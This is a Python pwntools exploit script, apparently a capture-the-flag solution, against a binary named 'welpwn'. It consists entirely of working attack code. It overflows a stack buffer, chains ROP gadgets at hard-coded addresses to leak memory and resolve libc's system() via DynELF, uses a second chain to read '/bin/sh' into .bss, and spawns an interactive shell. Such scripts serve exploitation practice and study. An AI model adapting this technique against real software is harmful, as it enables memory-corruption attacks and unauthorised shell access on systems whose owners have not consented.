from pwn import *
import pwnlib
context(os='linux', arch='amd64', log_level='debug')
p = process('./welpwn')
e=ELF("./welpwn")
ppppr = 0x40089c
poprdi = 0x004008a3
main = 0x4007CD
gad1=0x40089A
gad2=0x400880
read_got=e.got["read"]
puts_plt=e.plt["puts"]
bss_start =e.bss()
p.recvline()

def leak(addr):
    rop='A'*24 + p64(ppppr)
    rop += p64(poprdi) + p64(addr) + p64(puts_plt) + p64(main)
    p.send(rop)
    p.recvn(27)
    str = p.recvuntil('RCTF\n')
    result = str.split('\nWelcome')[0]
    if result == '':
        return '\x00'
    return result

d = DynELF(leak, elf=ELF('./welpwn'))
system = d.lookup('system', 'libc')
print "systemaddr======"+hex(system)
rop1='A'*24 + p64(ppppr)
rop1+= p64(gad1) + p64(0)+p64(1)+p64(read_got)+p64(9)+p64(bss_start)+p64(0)+p64(gad2)+"A"*56+ p64(poprdi) + p64(bss_start) + p64(system)

p.send( rop1)
p.send('/bin/sh\x00')

p.interactive()
